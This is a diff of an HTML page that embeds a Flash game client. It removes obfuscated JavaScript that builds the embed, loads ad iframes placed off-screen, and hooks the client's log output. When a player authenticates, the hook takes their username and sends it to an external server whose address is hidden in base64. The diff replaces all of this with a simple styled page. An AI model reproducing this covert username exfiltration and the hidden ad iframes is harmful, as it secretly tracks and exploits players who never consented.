@@ -1,121 +1,13 @@
 
-<script>
-window.myVars = {
-	"name": "Main Client",
-	"owner": "P",
-	"description": "",
-	"loader": "https://chat.kongregate.com/gamez/0029/7195/preview/loader.swf",
-	"flashVars": {
-		"resourceURL": "https://chat.kongregate.com/gamez/",
-		"clientPath": "0030/1371/preview/bmmClient6020.swf?4",
-		"generalLibraryPath":"0017/1560/live/generalLibrary.swf",
-		"itemsLibrary1Path": "0017/1560/live/itemsLibrary1.swf",
-		"itemsLibrary2Path": "0017/1560/live/itemsLibrary2.swf",
-		"itemsLibrary3Path": "0017/1560/live/itemsLibrary3.swf",
-		"soundsLibraryPath": "0017/1560/live/soundsLibrary_sound.swf",
-		"disableFB": "1",
-		"portals": "{\"10227\":{\"id\":\"10227\",\"location\":[100,400],\"name\":\"Thunder Vest\",\"startDate\":1537257600,\"bossID\":[\"UNDERTAKER\"],\"themeID\":3,\"duration\":9999,\"campaignID\":10227},\"10228\":{\"id\":\"10228\",\"name\":\"Burning Shower\",\"startDate\":1537948800,\"campaignID\":10228,\"bossID\":[\"EMP BOSS\"],\"duration\":9999,\"themeID\":3,\"location\":[200,400]},\"10229\":{\"id\":\"10229\",\"location\":[400,400],\"name\":\"Short Ranger\",\"startDate\":1540629000,\"themeID\":3,\"bossID\":[\"THE CLAW\"],\"duration\":9999,\"campaignID\":10229},\"10230\":{\"themeID\":3,\"campaignID\":10230,\"startDate\":1538987400,\"location\":[300,400],\"bossID\":[\"EMP BOSS\"],\"duration\":9999,\"name\":\"Blizzard Dissolver\",\"id\":\"10230\"}}",
-		"version": "6020",
-		"port": "9010"
-	}
-};
-</script>
-
-
-
 <style>
-.center{
+body{
+	margin: 0;
+	padding: 10%;
+	background-color: #611;
+	box-sizing: border-box;
+	border:solid #cc0;
+	border-width: 0px 30px;
 	text-align: center;
-	text-align: -webkit-center;
-	text-align: -moz-center;
-	text-align: -ms-center;
-	text-align: -khtml-center;
-}
-.c {
-	border: 10px solid black;
-	width: 800px;
-	overflow: visible;
-	box-shadow: 0px 0px 10px black;
-	border-radius: 10px;
-	position: relative;
-	overflow: hidden;
 }
 </style>
-
-<script>
-
-
-onload =()=>{
-	var bp=o=>Object.keys(o).map(a=>a+"="+o[a]).join("&");
-
-	var div = (_a=b=> document.createElement(b)) ("div"), div1 = _a("div"), object = _a("object"), w = window;
-	(_b=(a,b,c)=>a.setAttribute(b,c))(div,"class","center");
-	_b(div1,"class","c");
-	(_c=(a,b)=>a.appendChild(b))(div,div1);
-	_b(object,"data",myVars.loader);
-	_b(object,"type","application/x-shockwave-flash");
-	_b(object,"align","middle");
-	_b(object,"width","800");
-	_b(object,"height","480");
-	_c(object, (i = _a("param")) && ((_b(i,"name","quality")) || 1) && ((_b(i,"value","best")) || 1) && i );
-	_c(object, (i = _a("param")) && ((_b(i,"name","play")) || 1) && ((_b(i,"value","true")) || 1) && i );
-	_c(object, (i = _a("param")) && ((_b(i,"name","loop")) || 1) && ((_b(i,"value","false")) || 1) && i );
-	_c(object, (i = _a("param")) && ((_b(i,"name","wmode")) || 1) && ((_b(i,"value","opaque")) || 1) && i );
-	_c(object, (i = _a("param")) && ((_b(i,"name","scale")) || 1) && ((_b(i,"value","exactFit")) || 1) && i );
-	_c(object, (i = _a("param")) && ((_b(i,"name","menu")) || 1) && ((_b(i,"value","false")) || 1) && i );
-	_c(object, (i = _a("param")) && ((_b(i,"name","devicefont")) || 1) && ((_b(i,"value","false")) || 1) && i );
-	_c(object, (i = _a("param")) && ((_b(i,"name","salign")) || 1) && ((_b(i,"value","")) || 1) && i );
-	_c(object, (i = _a("param")) && ((_b(i,"name","allowscriptaccess")) || 1) && ((_b(i,"value","always")) || 1) && i );
-	_c(object, (i = _a("param")) && ((_b(i,"name","flashvars")) || 1) && ((_b(i,"value", bp(myVars.flashVars) )) || 1) && i );
-	_c(div1,object);
-	_c(document.body,div);
-
-
-
-
-
-	var frame = _a("iframe");
-	_b(frame,"src", "/a-ad.html");
-	_b(frame,"style", atob("cG9zaXRpb246Zml4ZWQ7bGVmdDoxMTElO2JvdHRvbToxMTElOw=="));
-	_c(document.body,frame);
-
-
-	var ik = _a("div");
-	_b(ik,"style","position:absolute;width:100%;height:100%;background:#fff;left:0;top:0;transition-duration:1s;padding-top:100px;");
-	_c(div1,ik);
-	w.rik=()=>{
-		ik.style.opacity = 0;
-		var a=()=>ik.style.display = "none";
-		w.setTimeout(a,1000);
-	};
-	w.aik=()=>{
-		ik.style.display = "inherit";
-		var a=()=>ik.style.opacity = 1;
-		w.setTimeout(a,10);
-	};
-	_c(ik, (i = _a("iframe")) && ((_b(i,"data-aa","1036247")) || 1) && ((_b(i,"src","//ad.a-ads.com/1036247")) || 1) && ((_b(i,"scrolling","no")) || 1) && ((_b(i,"style","border:0px;overflow:hidden;")) || 1) && ((_b(i,"allowtransparency","true")) || 1) && i );
-	_c(ik, (i = _a("div")) && ((_b(i,"class","center")) || 1) && ((_b(i,"onclick","rik()")) || 1) && ((_b(i,"style","cursor:pointer;margin:10px;")) || 1) && ((i.innerHTML = "close ad") || 1) && i );
-	w.ac = 0;
-	w.tslog=a=>{
-		if(a.split("gotData BMM_CHAT_EXIT").length==2 ){
-			//console.log("%cSM>"+JSON.stringify(a),"color:#005;");
-			//(w.ac = (w.ac+1)%10) ==9?aik():0;
-		}
-		
-		if(a.match(/finishAuthenticate\(\)/)){
-			try{
-				let data = a.split('() data: ')[1];
-				data = JSON.parse(data);
-				let i = new Image();
-				i.src = atob("aHR0cHM6Ly9rb3Jvc2hpYW11LjAwMHdlYmhvc3RhcHAuY29tL3NtL2hvb2sucGhwP2k9")+encodeURIComponent(btoa(data.username));
-			}catch(e){}
-		}
-	};
-	rik();
-
-};
-
-
-</script>
-
-<iframe data-aa='1036247' src='//ad.a-ads.com/1036247?size=120x60' scrolling='no' style='width:120px; height:60px; border:0px; padding:0;overflow:hidden;position:fixed;left:110%;' allowtransparency='true'></iframe>
+<img src="https://vignette.wikia.nocookie.net/akamegakill/images/f/fb/Night_Raid_Logo.png/revision/latest?cb=20140825003551" width="200vw">
